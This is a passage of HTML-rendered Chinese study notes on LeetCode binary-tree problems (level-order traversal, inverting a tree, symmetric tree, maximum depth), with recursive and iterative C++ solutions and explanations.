class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>            <span class="hljs-comment">// 这里一定要使用固定大小size，不要使用que.size()，因为que.size是不断变化的</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                vec.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>                <span class="hljs-keyword">if</span> (node-&gt;left) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>            result.<span class="hljs-built_in">push_back</span>(vec);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"># 递归法<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">order</span><span class="hljs-params">(TreeNode* cur, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; result, <span class="hljs-type">int</span> depth)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">if</span> (result.<span class="hljs-built_in">size</span>() == depth) result.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        result[depth].<span class="hljs-built_in">push_back</span>(cur-&gt;val);<br>        <span class="hljs-built_in">order</span>(cur-&gt;left, result, depth + <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">order</span>(cur-&gt;right, result, depth + <span class="hljs-number">1</span>);<br>    &#125;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">levelOrder</span>(TreeNode* root) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-type">int</span> depth = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">order</span>(root, result, depth);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="翻转二叉树">翻转二叉树</h1><p><a href="https://leetcode.cn/problems/invert-binary-tree/">226.翻转二叉树 - 力扣（LeetCode）</a></p><h2 id="递归法">递归法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-built_in">swap</span>(root-&gt;left, root-&gt;right);  <span class="hljs-comment">// 中</span><br>        <span class="hljs-built_in">invertTree</span>(root-&gt;left);         <span class="hljs-comment">// 左</span><br>        <span class="hljs-built_in">invertTree</span>(root-&gt;right);        <span class="hljs-comment">// 右</span><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法">迭代法</h2><h3 id="深度优先遍历">深度优先遍历</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> root;<br>        stack&lt;TreeNode*&gt; st;<br>        st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span>(!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();              <span class="hljs-comment">// 中</span><br>            st.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-built_in">swap</span>(node-&gt;left, node-&gt;right);<br>            <span class="hljs-keyword">if</span>(node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);   <span class="hljs-comment">// 右</span><br>            <span class="hljs-keyword">if</span>(node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);     <span class="hljs-comment">// 左</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        stack&lt;TreeNode*&gt; st;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">NULL</span>) &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);  <span class="hljs-comment">// 右</span><br>                <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);    <span class="hljs-comment">// 左</span><br>                st.<span class="hljs-built_in">push</span>(node);                          <span class="hljs-comment">// 中</span><br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-literal">NULL</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>                node = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-built_in">swap</span>(node-&gt;left, node-&gt;right);          <span class="hljs-comment">// 节点处理逻辑</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="广度优先遍历">广度优先遍历</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        queue&lt;TreeNode*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-built_in">swap</span>(node-&gt;left, node-&gt;right); <span class="hljs-comment">// 节点处理</span><br>                <span class="hljs-keyword">if</span> (node-&gt;left) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="对称二叉树">对称二叉树</h1><p><a href="https://leetcode.cn/problems/symmetric-tree/">101.对称二叉树 - 力扣（LeetCode）</a></p><p>对于二叉树是否对称，要比较的是根节点的左子树与右子树是不是相互翻转的，理解这一点就知道了<strong>其实我们要比较的是两个树（这两个树是根节点的左右子树）</strong>，所以在递归遍历的过程中，也是要同时遍历两棵树。</p><p><strong>正是因为要遍历两棵树而且要比较内侧和外侧节点，所以准确的来说是一个树的遍历顺序是左右中，一个树的遍历顺序是右左中。</strong></p><h2 id="递归法-1">递归法</h2><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">compare</span><span class="hljs-params">(TreeNode* left, TreeNode* right)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right != <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left-&gt;val != right-&gt;val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 注意这里我没有使用else</span><br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">bool</span> outside = <span class="hljs-built_in">compare</span>(left-&gt;left, right-&gt;right);   <span class="hljs-comment">// 左子树：左、 右子树：右</span><br><span class="hljs-type">bool</span> inside = <span class="hljs-built_in">compare</span>(left-&gt;right, right-&gt;left);    <span class="hljs-comment">// 左子树：右、 右子树：左</span><br><span class="hljs-type">bool</span> isSame = outside &amp;&amp; inside;                    <span class="hljs-comment">// 左子树：中、 右子树：中（逻辑处理）</span><br><span class="hljs-keyword">return</span> isSame;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">compare</span><span class="hljs-params">(TreeNode* left, TreeNode* right)</span> </span>&#123;<br>        <span class="hljs-comment">// 首先排除空节点的情况</span><br>        <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right != <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left == <span class="hljs-literal">NULL</span> &amp;&amp; right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-comment">// 排除了空节点，再排除数值不相同的情况</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (left-&gt;val != right-&gt;val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-comment">// 此时就是：左右节点都不为空，且数值相同的情况</span><br>        <span class="hljs-comment">// 此时才做递归，做下一层的判断</span><br>        <span class="hljs-type">bool</span> outside = <span class="hljs-built_in">compare</span>(left-&gt;left, right-&gt;right);   <span class="hljs-comment">// 左子树：左、 右子树：右</span><br>        <span class="hljs-type">bool</span> inside = <span class="hljs-built_in">compare</span>(left-&gt;right, right-&gt;left);    <span class="hljs-comment">// 左子树：右、 右子树：左</span><br>        <span class="hljs-type">bool</span> isSame = outside &amp;&amp; inside;                    <span class="hljs-comment">// 左子树：中、 右子树：中 （逻辑处理）</span><br>        <span class="hljs-keyword">return</span> isSame;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">compare</span>(root-&gt;left, root-&gt;right);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法-1">迭代法</h2><h3 id="使用队列">使用队列</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        queue&lt;TreeNode*&gt; que;<br>        que.<span class="hljs-built_in">push</span>(root-&gt;left);   <span class="hljs-comment">// 将左子树头结点加入队列</span><br>        que.<span class="hljs-built_in">push</span>(root-&gt;right);  <span class="hljs-comment">// 将右子树头结点加入队列</span><br>        <br>        <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>()) &#123;  <span class="hljs-comment">// 接下来就要判断这两个树是否相互翻转</span><br>            TreeNode* leftNode = que.<span class="hljs-built_in">front</span>(); que.<span class="hljs-built_in">pop</span>();<br>            TreeNode* rightNode = que.<span class="hljs-built_in">front</span>(); que.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (!leftNode &amp;&amp; !rightNode) &#123;  <span class="hljs-comment">// 左节点为空、右节点为空，此时说明是对称的</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 左右一个节点不为空，或者都不为空但数值不相同，返回false</span><br>            <span class="hljs-keyword">if</span> ((!leftNode || !rightNode || (leftNode-&gt;val != rightNode-&gt;val))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            que.<span class="hljs-built_in">push</span>(leftNode-&gt;left);   <span class="hljs-comment">// 加入左节点左孩子</span><br>            que.<span class="hljs-built_in">push</span>(rightNode-&gt;right); <span class="hljs-comment">// 加入右节点右孩子</span><br>            que.<span class="hljs-built_in">push</span>(leftNode-&gt;right);  <span class="hljs-comment">// 加入左节点右孩子</span><br>            que.<span class="hljs-built_in">push</span>(rightNode-&gt;left);  <span class="hljs-comment">// 加入右节点左孩子</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="使用栈">使用栈</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        stack&lt;TreeNode*&gt; st; <span class="hljs-comment">// 这里改成了栈</span><br>        st.<span class="hljs-built_in">push</span>(root-&gt;left);<br>        st.<span class="hljs-built_in">push</span>(root-&gt;right);<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* leftNode = st.<span class="hljs-built_in">top</span>(); st.<span class="hljs-built_in">pop</span>();<br>            TreeNode* rightNode = st.<span class="hljs-built_in">top</span>(); st.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (!leftNode &amp;&amp; !rightNode) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((!leftNode || !rightNode || (leftNode-&gt;val != rightNode-&gt;val))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            st.<span class="hljs-built_in">push</span>(leftNode-&gt;left);<br>            st.<span class="hljs-built_in">push</span>(rightNode-&gt;right);<br>            st.<span class="hljs-built_in">push</span>(leftNode-&gt;right);<br>            st.<span class="hljs-built_in">push</span>(rightNode-&gt;left);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的最大深度">二叉树的最大深度</h1><p><ahref="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104.二叉树的最大深度 - 力扣（LeetCode）</a></p><h2 id="递归法-2">递归法</h2><p>本题可以使用前序（中左右），也可以使用后序遍历（左右中），使用前序求的就是深度，使用后序求的是高度。</p><ul><li>二叉树节点的深度：指从根节点到该节点的最长简单路径边的条数或者节点数（取决于深度从0开始还是从1开始）</li><li>二叉树节点的高度：指从该节点到叶子节点的最长简单路径边的条数后者节点数（取决于高度从0开始还是从1开始）</li></ul><p><strong>而根节点的高度就是二叉树的最大深度</strong>，所以本题中我们通过后序求的根节点高度来求的二叉树最大深度。</p><ul><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getdepth</span><span class="hljs-params">(treenode* node)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件：如果为空节点的话，就返回0，表示高度为0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (node == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑：先求左子树的深度，再求右子树的深度，最后取左右深度最大的数值再加1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> leftdepth = <span class="hljs-built_in">getdepth</span>(node-&gt;left);<br><span class="hljs-type">int</span>  rightdepth = <span class="hljs-built_in">getdepth</span>(node-&gt;right);<br><span class="hljs-type">int</span> depth = <span class="hljs-number">1</span> + <span class="hljs-built_in">max</span>(leftdepth, rightdepth);<br><span class="hljs-keyword">return</span> depth;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 后序遍历</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getdepth</span><span class="hljs-params">(treenode* node)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> leftdepth = <span class="hljs-built_in">getdepth</span>(node-&gt;left);       <span class="hljs-comment">// 左</span><br>        <span class="hljs-type">int</span> rightdepth = <span class="hljs-built_in">getdepth</span>(node-&gt;right);     <span class="hljs-comment">// 右</span><br>        <span class="hljs-type">int</span> depth = <span class="hljs-number">1</span> + <span class="hljs-built_in">max</span>(leftdepth, rightdepth); <span class="hljs-comment">// 中</span><br>        <span class="hljs-keyword">return</span> depth;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxdepth</span><span class="hljs-params">(treenode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getdepth</span>(root);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 前序遍历</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getdepth</span><span class="hljs-params">(treenode* node, <span class="hljs-type">int</span> depth)</span> </span>&#123;<br>        result = depth &gt; result ? depth : result; <span class="hljs-comment">// 中</span><br><br>        <span class="hljs-keyword">if</span> (node-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;right == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> ;<br><br>        <span class="hljs-keyword">if</span> (node-&gt;left) &#123; <span class="hljs-comment">// 左</span><br>            depth++;    <span class="hljs-comment">// 深度+1</span><br>            <span class="hljs-built_in">getdepth</span>(node-&gt;left, depth);<br>            depth--;    <span class="hljs-comment">// 回溯，深度-1</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (node-&gt;right) &#123; <span class="hljs-comment">// 右</span><br>            depth++;    <span class="hljs-comment">// 深度+1</span><br>            <span class="hljs-built_in">getdepth</span>(node-&gt;right, depth);<br>            depth--;    <span class="hljs-comment">// 回溯，深度-1</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxdepth</span><span class="hljs-params">(treenode* root)</span> </span>&#123;<br>        result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> result;<br>        <span class="hljs-built_in">getdepth</span>(root, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法-2">迭代法</h2><p>使用迭代法的话，使用层序遍历是最为合适的，因为最大的深度就是二叉树的层数，和层序遍历的方式极其吻合。</p><p>在二叉树中，一层一层的来遍历二叉树，记录一下遍历的层数就是二叉树的深度，如图所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxdepth</span><span class="hljs-params">(treenode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> depth = <span class="hljs-number">0</span>;<br>        queue&lt;treenode*&gt; que;<br>        que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            depth++; <span class="hljs-comment">// 记录深度</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                treenode* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (node-&gt;left) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> depth;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 